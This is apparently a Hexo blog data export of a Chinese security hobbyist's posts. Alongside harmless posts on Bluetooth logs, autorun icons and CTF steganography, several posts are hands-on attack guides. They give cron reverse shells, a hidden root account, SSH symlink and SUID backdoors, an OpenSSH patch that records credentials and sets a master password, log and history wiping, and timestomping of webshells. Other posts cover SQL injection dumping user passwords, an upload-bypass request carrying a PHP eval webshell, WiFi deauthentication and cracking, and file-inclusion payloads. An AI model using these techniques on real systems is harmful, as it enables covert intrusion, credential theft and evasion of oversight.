{"meta":{"title":"从零开始的学习生涯","subtitle":"FDrag0n的学习生涯","description":"菜鸡安全狗","author":"FDrag0n","url":"http://yoursite.com"},"pages":[{"title":"分类","date":"2018-01-26T04:42:59.000Z","updated":"2018-01-26T04:50:14.525Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2018-01-16T05:07:10.000Z","updated":"2018-01-26T04:50:25.031Z","comments":false,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"获取你耳机的蓝牙版本","slug":"获取你耳机的蓝牙版本","date":"2019-08-27T07:34:55.000Z","updated":"2019-08-27T07:56:54.374Z","comments":true,"path":"2019/08/27/获取你耳机的蓝牙版本/","link":"","permalink":"http://yoursite.com/2019/08/27/获取你耳机的蓝牙版本/","excerpt":"","text":"蓝牙耳机在各大手机厂干掉了耳机口之后，他们就可以更好地卖蓝牙耳机了。 各大，卖点也出来了，什么TWS，蓝牙5.0，aptx，aac，ldac等等 TWS：为True Wireless Stereo的缩写，是真正无线立体声 蓝牙5.0：于美国时间2016年6月16日在伦敦正式发布,为现阶段最高级的蓝牙协议标准。 但是怎么知道一款耳机到底是不是蓝牙5.0呢？而它具体的芯片是哪一款呢？这些很多厂家都不会告诉你。 获取你耳机的蓝牙版本 以小米手机为例，开启开发者模式的蓝牙抓包日志 如图上白点处，各手机操作差不多 将系统存储目录下的./MUIU/debug_log/common/btsnoop_hci.log（不同的手机这个文件的位置不同，可以自行搜索确认。还有的手机可能需要root权限，在/data/misc/bluetooth/logs下面）文件发送至电脑 使用wireshark打开日志文件，搜索Read Remote Version Information Complete 在红线的位置即可查看目标设备的蓝牙版本号和芯片厂家 协议的文档读的头疼，剩下的可能懒得看了0.0","categories":[],"tags":[]},{"title":"testimg","slug":"testimg","date":"2019-08-19T02:47:49.000Z","updated":"2019-08-19T03:00:04.590Z","comments":true,"path":"2019/08/19/testimg/","link":"","permalink":"http://yoursite.com/2019/08/19/testimg/","excerpt":"这是在测试图片","text":"这是在测试图片","categories":[],"tags":[]},{"title":"自用Linux命令手册","slug":"自用Linux命令手册","date":"2018-11-11T14:42:50.000Z","updated":"2018-11-12T11:57:42.710Z","comments":true,"path":"2018/11/11/自用Linux命令手册/","link":"","permalink":"http://yoursite.com/2018/11/11/自用Linux命令手册/","excerpt":"Linux/Unix 修改文件时间戳Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。 比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。","text":"Linux/Unix 修改文件时间戳Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。 比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。 利用方法 touch -r index.php webshell.php 或者直接将时间戳修改成某年某月某日。如下 2018 年 11 月 11 日。 touch -t 1811111042.30 webshell.php","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"Linux后门总结","slug":"2018-11-7-Linux后门总结","date":"2018-11-07T11:09:37.000Z","updated":"2018-11-12T11:57:56.052Z","comments":true,"path":"2018/11/07/2018-11-7-Linux后门总结/","link":"","permalink":"http://yoursite.com/2018/11/07/2018-11-7-Linux后门总结/","excerpt":"测试环境ubuntu16.04反弹shell目标：127.0.0.1:233 cron定时反弹shell","text":"测试环境ubuntu16.04反弹shell目标：127.0.0.1:233 cron定时反弹shell 修改crontab文件 创建文件 /etc/… #!/bin/bash if netstat -ano|grep -v grep | grep &quot;127.0.0.1&quot;&gt;/dev/null then echo &quot;OK&quot;&gt;/dev/null else /sbin/iptables --policy INPUT ACCEPT /sbin/iptables --policy OUTPUT ACCEPT bash -i &gt;&amp; /dev/tcp/127.0.0.1/233 0&gt;&amp;1 fi 增加权限 chmod +sx /etc/... 然后在/etc/crontab中添加定时任务 */1 * * * * root /etc/... 最后重启一下 crond 的服务service cron reload 一句话Crontab后门bash版本(crontab -l;printf &quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/127.0.0.1/233;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\\rno crontab forwhoami%100c\\n&quot;)|crontab -python版本(crontab -l;printf &quot;*/5 * * * * /usr/bin/python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;127.0.0.1\\&quot;,233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);&#39;;\\r\\rno crontab forwhoami%100c\\n&quot;)|crontab - Linux/Unix 添加 UID 为 0 的用户免交互设置密码 useradd seradd -u 0 -o -g root -G fdrag0n echo &quot;passwd&quot; | passwd --stdin fdrag0n 因为linux可能有密码策略所以推荐使用强密码替换passwd 爆破linux密码取出/etc/shadowhashcat爆破 ssh公钥免密将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。 客户端： $ ssh-keygen -t rsa $ ls id_rsa id_rsa.pub 把id_rsa.pub写入服务端的authorized_keys中，并修改好相应权限。 服务端： $ chmod 600 ~/.ssh/authorized_keys $ chmod 700 ~/.ssh 这种后门的特点是简单易用，但在实战中会被服务器的配置环境所限制，以及容易被发现(只要运维不傻)。 软连接后门ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=23333; 经典后门。直接对sshd建立软连接，之后用任意密码登录即可。 但这隐蔽性很弱，防护软件或者查看端口状态都可以找到。 重启会断开 SUID shell在root账号下执行 cp /bin/bash /.fdrag0n chmod 4755 /.fdrag0n 在普通用户下执行 /.fdrag0n -p 检查手段 find / -perm +4000 -ls inetd后门修改 /etc/inetd.conf 文件 原文件： #chargen dgram udp wait root internal #discard stream tcp nowait root internal #discard dgram udp wait root internal #daytime stream tcp nowait root internal 修改为: #discard stream tcp nowait root internal #discard dgram udp wait root internal daytime stream tcp nowait root /bin/bash bash -i 然后重启inetd ps -ef | grep inetdroot kill -HUP xxx 然后nc连接即可 rootkitopenssh后门参见https://fdrag0n.github.io/2018/05/15/SSH后门复现/ 内核级rookit暂未复现，复现后补上","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"PHP数组与c数组差异而引发的安全问题","slug":"PHP数组与c数组差异而引发的问题","date":"2018-08-24T14:19:24.000Z","updated":"2019-08-19T03:00:15.638Z","comments":true,"path":"2018/08/24/PHP数组与c数组差异而引发的问题/","link":"","permalink":"http://yoursite.com/2018/08/24/PHP数组与c数组差异而引发的问题/","excerpt":"C语言数组C语言的数组都是由连续的内存位置组成。最低的地址对应第一个元素，最高的地址对应最后一个元素。 设有一个数组 1int array[2]; 无论是先给array[0]赋值,还是先给array[1]赋值，其在内存中的排序都是array[0]在前面array[1]在后面，所以无论是用指针指向array的最后一个单元还是直接引用array[1]的值,其所指的都是同一个值。","text":"C语言数组C语言的数组都是由连续的内存位置组成。最低的地址对应第一个元素，最高的地址对应最后一个元素。 设有一个数组 1int array[2]; 无论是先给array[0]赋值,还是先给array[1]赋值，其在内存中的排序都是array[0]在前面array[1]在后面，所以无论是用指针指向array的最后一个单元还是直接引用array[1]的值,其所指的都是同一个值。 PHP的数组而PHP数组与C语言数组不一样，PHP 中的数组实际上是一个有序映射。映射是一种把 values 关联到 keys 的类型。此类型在很多方面做了优化，因此可以把它当成真正的数组，或列表（向量），散列表（是映射的一种实现），字典，集合，栈，队列以及更多可能性。由于数组元素的值也可以是另一个数组，树形结构和多维数组也是允许的。贴上一个简易的上传过滤源码 &lt;?php $file = $_GET[&apos;file&apos;]; if (!is_array($file)) { $file = explode(&apos;.&apos;, strtolower($file)); } print_r ($file); echo &apos;&lt;/br&gt;&apos;; $ext = end($file); if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) { print(&apos;This file is not allowed!&lt;/br&gt;&apos;); } else print(&apos;success!&lt;/br&gt;&apos;); var_dump($file); echo &apos;&lt;/br&gt;&apos;; $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1]; echo &apos;filename:&apos;.$filename; echo &apos;&lt;/br&gt;&apos;; echo &apos;end($file):&apos;.end($file); ?&gt; 如图file[0]和file[1]都是由get传参，如果先给file[0]赋值png，再给file[1]赋值php的话，会被拦截。 file[0]=png&amp;file[1]=php 但是如果先给file[1]赋值php，再给file[0]赋值png的话，则可以成功绕过过滤规则上传。 file[1]=php&amp;file[0]=png 演示截图： 代码第六行和第十二行将其显示出来，由图右侧可见，如果先给file[0]赋值png，再给file[1]赋值php的话，数组是Array ( [0] =&gt; png [1] =&gt; php )，会被拦截。 而如果先给file[1]赋值php，再给file[0]赋值png的话，数组就是Array ( [1] =&gt; php [0] =&gt; png ) ,它所占内存区域中最后一个单元是file[0]=&gt;png，而不像C语言一样是file[1]，所以如果过滤代码一方面用end()来取出数组最后一个单元，而另外一处却用$file[count($file) - 1]来取出最后一个单元，就会存在有绕过的漏洞。 拿python来比较一下更好说明 C语言的数组更像Python 列表(List) 而PHP的数组像Python 字典(Dictionary) 涉及到的CTF： 网鼎杯第二场的上传题–wafUpload&lt;?php $sandbox = &apos;/var/www/html/upload/&apos; . md5(&quot;phpIsBest&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]); @mkdir($sandbox); @chdir($sandbox); if (!empty($_FILES[&apos;file&apos;])) { #mime check if (!in_array($_FILES[&apos;file&apos;][&apos;type&apos;], [&apos;image/jpeg&apos;, &apos;image/png&apos;, &apos;image/gif&apos;])) { die(&apos;This type is not allowed!&apos;); } #check filename $file = empty($_POST[&apos;filename&apos;]) ? $_FILES[&apos;file&apos;][&apos;name&apos;] : $_POST[&apos;filename&apos;]; if (!is_array($file)) { $file = explode(&apos;.&apos;, strtolower($file)); } $ext = end($file); if (!in_array($ext, [&apos;jpg&apos;, &apos;png&apos;, &apos;gif&apos;])) { die(&apos;This file is not allowed!&apos;); } $filename = reset($file) . &apos;.&apos; . $file[count($file) - 1]; if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $sandbox . &apos;/&apos; . $filename)) { echo &apos;Success!&apos;; echo &apos;filepath:&apos; . $sandbox . &apos;/&apos; . $filename; } else { echo &apos;Failed!&apos;; } } show_source(__file__); ?&gt; 第8-10行mime check部分 MIME 类型检测，使用图片马绕过。 第12-20行check filename部分 对文件后缀进行了检测，而后缀名则是取 $file 数组中最后一个元素。然后在生成文件的时候，文件名取$file 数组的最后一个元素做后缀，这明显存在绕过。我们只要控制$file数组中参数的即可绕过并 getshell ，请求数据包如下 POST / HTTP/1.1 Host: 4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://4b590ee044fe8fb3a180712f8407e4136069037e.game.ichunqiu.com/ Content-Type: multipart/form-data; boundary=---------------------------9930139772306 Content-Length: 524 DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 -----------------------------9930139772123 Content-Disposition: form-data; name=&quot;filename[1]&quot; php -----------------------------9930139772123 Content-Disposition: form-data; name=&quot;filename[0]&quot; png -----------------------------9930139772123 Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;fdrag0n.jpg&quot; Content-Type: image/jpeg &lt;?php @eval($_POST[&apos;a&apos;]);?&gt; -----------------------------9930139772123 Content-Disposition: form-data; name=&quot;submit&quot; Submit -----------------------------9930139772123--","categories":[],"tags":[]},{"title":"利用autorun.inf预防自动运行病毒及个性化磁盘图标","slug":"利用autorun-inf预防自动运行病毒及个性化磁盘图标","date":"2018-08-13T02:37:01.000Z","updated":"2019-08-19T03:00:22.667Z","comments":true,"path":"2018/08/13/利用autorun-inf预防自动运行病毒及个性化磁盘图标/","link":"","permalink":"http://yoursite.com/2018/08/13/利用autorun-inf预防自动运行病毒及个性化磁盘图标/","excerpt":"AutoRun简介 AutoRun和AutoPlay是微软窗口系统的组件，其内容标示着系统在搜索到设备时可采取的行动。 AutoRun在Windows 95时首度露面，目的是帮助用户正确运行光盘上制作者想要运行的文件，另外AutoRun也能透过双击我的计算机内的设备图标启动AutoRun。但后来U盘病毒横行，微软发布更新关闭非光盘驱动器的AutoRun。 在Windows XP之后，微软让用户方便选择相关应用程序，制作出如图形化接口方式让用户选择如何处理设备中的文件。 AutoRun.inf文件 autrun.inf是我们电脑使用中比较常见的文件之一 ，其作用是允许在双击磁盘时自动运行指定的某个文件。但是近几年出现了用autorun.inf文件传播木马或病毒，它通过使用者的误操作让目标程序执行，达到侵入电脑的目的，带来了很大的负面影响。 AutoRun.inf的示例[autorun] open=setup.exe icon=setup.exe,0 label=My install CD 双击盘符时会运行setup.exe，而显示图标为setup.exe中第0个图标（即第1个图标），标签是My install CD。 AutoRun.inf的默认激活 插入设备时启动。 双击我的计算机设备时启动。 对我的计算机设备点击右键菜单中 “AutoRun” 项目时启动。 其他(如点击根目录文件夹)则不会启动。windows XP 以前 所有设备都会依照 Autorun.inf 启动。Windows 7 只有光盘会先运行 autorun.inf 利用autorun.inf给硬盘改图标及简易防病毒个性化磁盘—改图标在对应磁盘的根目录新建一个记事本，然后修改里面内容 [AUTORUN] ICON=drag0n.ico 然后将其保存为autorun.inf（注意ico的文件名字符不要超过6位）","text":"AutoRun简介 AutoRun和AutoPlay是微软窗口系统的组件，其内容标示着系统在搜索到设备时可采取的行动。 AutoRun在Windows 95时首度露面，目的是帮助用户正确运行光盘上制作者想要运行的文件，另外AutoRun也能透过双击我的计算机内的设备图标启动AutoRun。但后来U盘病毒横行，微软发布更新关闭非光盘驱动器的AutoRun。 在Windows XP之后，微软让用户方便选择相关应用程序，制作出如图形化接口方式让用户选择如何处理设备中的文件。 AutoRun.inf文件 autrun.inf是我们电脑使用中比较常见的文件之一 ，其作用是允许在双击磁盘时自动运行指定的某个文件。但是近几年出现了用autorun.inf文件传播木马或病毒，它通过使用者的误操作让目标程序执行，达到侵入电脑的目的，带来了很大的负面影响。 AutoRun.inf的示例[autorun] open=setup.exe icon=setup.exe,0 label=My install CD 双击盘符时会运行setup.exe，而显示图标为setup.exe中第0个图标（即第1个图标），标签是My install CD。 AutoRun.inf的默认激活 插入设备时启动。 双击我的计算机设备时启动。 对我的计算机设备点击右键菜单中 “AutoRun” 项目时启动。 其他(如点击根目录文件夹)则不会启动。windows XP 以前 所有设备都会依照 Autorun.inf 启动。Windows 7 只有光盘会先运行 autorun.inf 利用autorun.inf给硬盘改图标及简易防病毒个性化磁盘—改图标在对应磁盘的根目录新建一个记事本，然后修改里面内容 [AUTORUN] ICON=drag0n.ico 然后将其保存为autorun.inf（注意ico的文件名字符不要超过6位） 再将你想用的图标转换成ico文件，推荐分辨率不要超过48x48，然后一同放进同目录下，然后改名为fdragn.ico。 简易防病毒此时文件是显示在当前目录下的，可以使用Windows下的attrib命令给文件增加属性 attrib指令的格式和常用参数为 ATTRIB [+R | -R] [+A | -A ] [+S | -S] [+H | -H] [[drive:] [path] filename] [/S [/D]] + 设置属性。 - 清除属性。 R 只读文件属性。 A 存档文件属性。 S 系统文件属性。 H 隐藏文件属性。 I 无内容索引文件属性。 [drive:][path][filename] 指定要处理的文件属性。 /S 处理当前文件夹及其子文件夹中的匹配文件。 /D 处理文件夹。 /L 处理符号链接和符号链接目标的属性。 所以使用 attrib +s +h +r autorun.inf 给autorun.inf添加系统、隐藏和只读属性，防止病毒修改autorun.inf文件 attrib +s +h drag0n.ico 给drag0n.ico文件添加系统和隐藏属性，美观。 如果还要修改的话，使用以下命令将其显示出来 attrib -s -h -r autorun.inf attrib -s -h fdrag0n.ico","categories":[],"tags":[]},{"title":"ctf常见隐写术总结","slug":"ctf常见隐写术总结","date":"2018-07-30T03:57:03.000Z","updated":"2019-08-19T03:00:30.632Z","comments":true,"path":"2018/07/30/ctf常见隐写术总结/","link":"","permalink":"http://yoursite.com/2018/07/30/ctf常见隐写术总结/","excerpt":"准备工具：winhex付费版（免费版功能有缺失），Stegsolve，MP3Steno等 ctf常见隐写术总结简单隐写： 右键查看图片属性，检查图片简介。 winhex打开，Ctrl+F查找有无flag明文。","text":"准备工具：winhex付费版（免费版功能有缺失），Stegsolve，MP3Steno等 ctf常见隐写术总结简单隐写： 右键查看图片属性，检查图片简介。 winhex打开，Ctrl+F查找有无flag明文。 文件类型：给出的文件不一定是它后缀名显示的文件，所以应该先用winhex打开它确认文件种类 JPEG (jpg)，文件头：FFD8FF PNG (png)，文件头：89504E47 GIF (gif)，文件头：47494638 Windows Bitmap (bmp)，文件头：424D ZIP Archive (zip)，文件头：504B0304 RAR Archive (rar)，文件头：52617221 复合文件：在kali里面使用binwalk工具即可查看如： root@kali:~# binwalk ‘/root/桌面/misc1.jpg’ DECIMAL HEXADECIMAL DESCRIPTION -——————————————————————————- 0 0x0 JPEG image data, EXIF standard 120xC TIFF image data, little-endian offset of first image directory: 8 4413190x6BBE7 Zip archive data, encrypted at least v2.0 to extract, compressed size: 90598, uncompressed size: 91905, name: hidden.jpg 5319570x81DF5 Zip archive data, encrypted at least v2.0 to extract, compressed size: 38092, uncompressed size: 38829, name: logo.png 5702690x8B39D End of Zip archive 可以看到有zip之类的文件在里面，所以直接利用binwalk提取， binwalk -e 图片高度一般这类的图片都会有明显的提示，包括但不限于箭头指向图片外，图片看上去不完整等。根据对应文件种类找到其高度位进行修改。 png文件， 多图层隐写最牛神器 zsteg毁天灭地 隐写术一大神器：stegsolve LSB隐写 如果上文测试找不到flag的话，可以使用stegsolve打开文件，然后点击左右翻动的按钮，可能会出现flag。 提取低位信息，一般都藏在0,1,2这些低位里面，在软件功能选项中查看Analyse→Data Extract，逐个调试。","categories":[],"tags":[]},{"title":"破解中兴电视盒子","slug":"破解中兴电视盒子","date":"2018-07-18T16:59:29.000Z","updated":"2019-08-19T03:00:34.180Z","comments":true,"path":"2018/07/19/破解中兴电视盒子/","link":"","permalink":"http://yoursite.com/2018/07/19/破解中兴电视盒子/","excerpt":"#记一次破解电信盒子 ##型号 ZTEB860AV1.1因为以前搞过家里的tcl电视，所以流程已经清楚 开启网络adb调试 为所欲为","text":"#记一次破解电信盒子 ##型号 ZTEB860AV1.1因为以前搞过家里的tcl电视，所以流程已经清楚 开启网络adb调试 为所欲为 ###开始 百度得知进入设置的密码为：6321进入设置后连接WiFi，然后到设置里找到开启adb调试，结果发现开启adb居然也需要密码，不得不说这群人为了控制用户也是下了血本，还好百度找到有写好的软件，上链接 工具相关软件 利用网络adb给电视盒子安装电视管理软件或者第三方桌面开始为所欲为。 在这里又发现一个问题，这边运营商将网线插口插在光猫的iptv上面，而那条路线是专线，无法正常使用，机顶盒开机会自动检测是否在这个网络下，不在就无法正常开机，所以每次开机的时候还得手动将设置中的网络设置改成有线连接，如果使用第三方应用则使用无线连接局域网即可，暂时没有想到更好地解决方案","categories":[],"tags":[]},{"title":"SSH后门复现","slug":"SSH后门复现","date":"2018-05-15T12:01:46.000Z","updated":"2019-08-19T03:00:40.735Z","comments":true,"path":"2018/05/15/SSH后门复现/","link":"","permalink":"http://yoursite.com/2018/05/15/SSH后门复现/","excerpt":"#SSH后门复现 最开始先查看自己的ssh版本ssh -v","text":"#SSH后门复现 最开始先查看自己的ssh版本ssh -v 然后下载openssh和ssh后门12345678wget http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gzwget http://openbsd.org.ar/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gztar zxvf openssh-5.9p1.tar.gztar zxvf 0x06-openssh-5.9p1.patch.tar.gzcd openssh-5.9p1.patch/cp sshbd5.9p1.diff ../openssh-5.9p1cd ../openssh-5.9p1patch &lt; sshbd5.9p1.diff //patch 后门 这时有可能出现报错信息-bash: patch: command not found代表没有安装patch命令包，解决方案： yum -y install patch 备份SSH原始配置文件12mv /etc/ssh/ssh_config /etc/ssh/ssh_config.oldmv /etc/ssh/sshd_config /etc/ssh/sshd_config.old 修改后门密码，和记录文件的位置vi includes.h 找到并修改123456#define ILOG &quot;/tmp/ilog&quot;//记录登录到本机的用户名和密码#define OLOG &quot;/tmp/olog&quot;//记录本机登录到远程的用户名和密码#define SECRETPW &quot;fdrag0n&quot;//你后门的密码 修改SSH版本信息，改为第一步看到的vi version.h 环境配置如果没有以上环境有可能会报错 123yum install -y gccyum install -y openssl openssl-devel pam-devel./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 如果出现报错信息中带有：configure: error: zlib.h missing – please install first or check config.log之类的信息安装zib yum install -y zlib 安装并重启SSH12make &amp;&amp; make installservice sshd restart 简单处理记录还原新配置文件为旧配置文件时间12touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_configtouch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config 将ssh_config和sshd_config修改时间跟ssh_config.old和sshd_config.old一致，减少被发现的概率。 清除apache日志12345export HISTFILE=/dev/null export HISTSIZE=0 cd /etc/httpd/logs/ sed -i ‘/192.168.52.175/d’ access_log* echo &gt;/root/.bash_history //清空操作日志 清除用户目录下的.bash_history文件vi .bash_history 然后全部删除保存。","categories":[],"tags":[]},{"title":"sql手注步骤（非盲注）","slug":"sql手注步骤","date":"2018-05-05T03:52:16.000Z","updated":"2019-08-19T03:00:47.758Z","comments":true,"path":"2018/05/05/sql手注步骤/","link":"","permalink":"http://yoursite.com/2018/05/05/sql手注步骤/","excerpt":"手注步骤","text":"手注步骤 目录1.判断是否存在注入，注入是字符型还是数字型 2.猜解SQL查询语句中的字段数 3.确定显示的字段顺序 4.获取当前数据库 5.获取数据库中的表 6.获取表中的字段名 7.下载数据 1.判断是否存在注入，注入是字符型还是数字型判断注入类型：数字型，字符型 2.猜解SQL查询语句中的字段数判断字段数： 1′ or 1=1 order by 1,2,3,4,5 # 数字累加，直到不出结果或者报错。 注释常常使用--+或者#或者%23 或者用： -1′ union select 1,2 # 两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来 顺路进行下一步 3.确定显示的字段顺序-1′ union select 1,2 # 4.获取当前数据库-1′ union select 1,database() # 5.获取数据库中的表-1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 从information_schema中查找表名 进行联合查询时要将查询用的语句放在最后一项 6.获取表中的字段名-1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ # 爆users表内的表名 7.下载数据-1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # 从users里面取出所有用户的user_id,first_name,last_name,password的数据","categories":[{"name":"sql","slug":"sql","permalink":"http://yoursite.com/categories/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"http://yoursite.com/tags/sql/"}]},{"title":"利用kali破解wpa/wpa2加密的WIFI（爆破美学）","slug":"利用kali破解wpa-wpa2加密的WIFI（爆破美学）","date":"2018-05-01T14:26:38.000Z","updated":"2019-08-19T03:00:57.541Z","comments":true,"path":"2018/05/01/利用kali破解wpa-wpa2加密的WIFI（爆破美学）/","link":"","permalink":"http://yoursite.com/2018/05/01/利用kali破解wpa-wpa2加密的WIFI（爆破美学）/","excerpt":"利用kali破解wpa/wpa2加密的WIFI（爆破美学）硬件准备阶段：因为用vm安装的kali不支持笔记本内置的无限网卡所以需要购买kali支持的网卡，博主买的是RT3070L芯片组的网卡，某宝上面无壳的只要20元，加壳才25元。","text":"利用kali破解wpa/wpa2加密的WIFI（爆破美学）硬件准备阶段：因为用vm安装的kali不支持笔记本内置的无限网卡所以需要购买kali支持的网卡，博主买的是RT3070L芯片组的网卡，某宝上面无壳的只要20元，加壳才25元。 在kali中必须识别出网卡，使用ifconfig查看网卡信息，wlan0为无线网卡。 攻击准备阶段：开启网卡监听模式：airmon-ng start wlan0 如果成功的话，网卡名称会变成wlan0mon 扫描热点：airodump-ng wlan0mon 可以看到如图信息[ 抓握手包：c代表信道，bssid为mac地址，w参数指的是抓到的包放的目录以及包的名字。 airodump-ng wlan0mon -c 4 --bssid XX:XX:XX:XX -w /root -c 选择信道，对应上图CH --bssid 需要破解的wifi的mac地址 -w cap文件名及路径 wlan0mon 启用监听模式的网卡名 当有人连接时就能抓到握手包。 如果对面都在使用wifi，没人连接怎么办？通过以下命令断开设备与WiFi的连接 aireplay-ng -0 20 -a A8:6B:7C:19:9F:D0 -c 4C:49:E3:D8:FD:7F wlan0mon -0 death（强制下线模式），20为执行次数 -c 被断网的客户机MAC -a WIFI热点的mac 抓包成功后白圈出现信息。 爆破：kali：利用aircrack-ng命令 aircrack-ng -w 字典 握手包 cpu跑这个破解速度有些慢。 windows：神器1：EWSA，然而7.x版本虽然支持gpu加速，然而没有破解版软件，只能查看密码前两位，收费299$(贵死人) 神器2：oclHashcat，使用方法有些复杂，是一个win下面的使用命令行的工具，破解速度十分可观。有国人开发了中文版的UI，减少了使用成本，链接：HashcatGUI_cn – HashcatGUI 中文版","categories":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/categories/kali/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"文件包含漏洞常用命令","slug":"文件包含漏洞常用命令","date":"2018-04-09T08:56:35.000Z","updated":"2019-08-19T03:01:02.385Z","comments":true,"path":"2018/04/09/文件包含漏洞常用命令/","link":"","permalink":"http://yoursite.com/2018/04/09/文件包含漏洞常用命令/","excerpt":"主要包含形式1.包含本地文件payload：","text":"主要包含形式1.包含本地文件payload： ?page=C:\\oneword ?file=C:\\boot.ini（Windows查看系统版本） ?file=C:\\WindowsSystem32inetsrvMetaBase.xml（Windows查看IIS配置文件) 2.包含远程文件payload： ?url=http://www.bbb.com/2.txt ?url=[http|https|ftp]://www.bbb.com/2.txt（可以有三种，http、https、ftp） 3.伪协议1) php://input 说明： 用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。 条件： php &lt;5.0 ，allow_url_include=Off 情况下也可以用 php &gt; 5.0，只有在allow_url_fopen=On 时才能使用 用例1 增加一句话： URL： http://localhost/include/file.php?file=php://input POST： &lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;a&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt; 用例2 增加文件： URL：http://localhost/include/file.php?file=php://inputPOST：&lt;?php fputs(fopen(&quot;oneword.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt;这里fopen参数为w，可新建一个文件。 用例3 执行系统命令： URL：http://localhost/include/file.php?file=php://inputPOST：&lt;?php system(&#39;ipconfig&#39;);?&gt; 2)data:// 说明： 这是一种数据流封装器，data:URI schema(URL schema可以是很多形式) 利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中 条件： allow_url_include=Onphp &gt; 5.2 3)php://filter 说明： 这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输过来： ?page=php://filter/read=convert.base64-encode/resource=php.ini 访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码 payload: http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=file.php 资料来源：https://www.anquanke.com/post/id/86123","categories":[],"tags":[]},{"title":"打造手机渗透神器kali-linux-nethunter安装","slug":"打造手机渗透神器kali-linux-nethunter安装","date":"2018-03-10T04:59:57.000Z","updated":"2019-08-19T03:01:07.303Z","comments":true,"path":"2018/03/10/打造手机渗透神器kali-linux-nethunter安装/","link":"","permalink":"http://yoursite.com/2018/03/10/打造手机渗透神器kali-linux-nethunter安装/","excerpt":"一加1（bacon） Kali Nethunter安装指南准备工作 准备一加一手机 解锁并刷到CM12并且开过一次机（我用魔趣也能成功，理论上来说任意6.0都行） 刷好TWRP recovery","text":"一加1（bacon） Kali Nethunter安装指南准备工作 准备一加一手机 解锁并刷到CM12并且开过一次机（我用魔趣也能成功，理论上来说任意6.0都行） 刷好TWRP recovery 官网下载刷机包 夜版（nightly） 刷机包本体： https://build.nethunter.com/nightly/2017.11-18-1618/nethunter-generic-armhf-kalifs-full-rolling-2017.11-18-1618.zip 内核： 6.0 https://build.nethunter.com/nightly/2017.11-18-1618/kernel-nethunter-oneplus1-marshmallow-2017.11-18-1618.zip 正式版（强烈推荐） 刷机包本体： https://build.nethunter.com/release/marshmallow/nethunter-oneplus1-marshmallow-kalifs-full-3.20-20170717-1810.zip 刷机 千万别双清，千万别双清，千万别双清（如果date被清了会刷写失败） 卡刷刷机包本体（正式版） （如果是夜版先刷内核再刷刷机包本体）","categories":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/categories/kali/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"记一次解决某网站高速下载病毒","slug":"记一次解决某网站高速下载病毒","date":"2018-02-11T03:19:04.000Z","updated":"2019-08-19T03:01:11.640Z","comments":true,"path":"2018/02/11/记一次解决某网站高速下载病毒/","link":"","permalink":"http://yoursite.com/2018/02/11/记一次解决某网站高速下载病毒/","excerpt":"怒草流氓软件在某网站上下载软件，不小心用了高速下载，然后就被安装了流氓软件。天天开机弹广告，还不是启动项，通过进程删掉流氓软件后每次开机出现explorer.exe警告，在网上搜索后找到解决方案。","text":"怒草流氓软件在某网站上下载软件，不小心用了高速下载，然后就被安装了流氓软件。天天开机弹广告，还不是启动项，通过进程删掉流氓软件后每次开机出现explorer.exe警告，在网上搜索后找到解决方案。 